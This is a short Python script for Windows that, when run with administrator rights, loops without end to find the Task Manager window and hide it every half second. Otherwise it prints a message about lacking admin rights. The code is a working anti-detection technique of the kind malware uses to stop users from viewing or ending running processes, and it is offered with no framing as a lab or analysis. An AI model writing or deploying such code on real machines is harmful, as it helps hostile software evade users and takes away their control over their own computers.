import ctypes
from win32gui import FindWindow, ShowWindow
from win32con import SW_HIDE
from win32api import Sleep

if ctypes.windll.shell32.IsUserAnAdmin() == 1:
    while (1):
        hwnd = FindWindow(0, "Task Manager")
        ShowWindow(hwnd, SW_HIDE)
        Sleep(500)
        
else:
    print("You do not possess administrative rights!")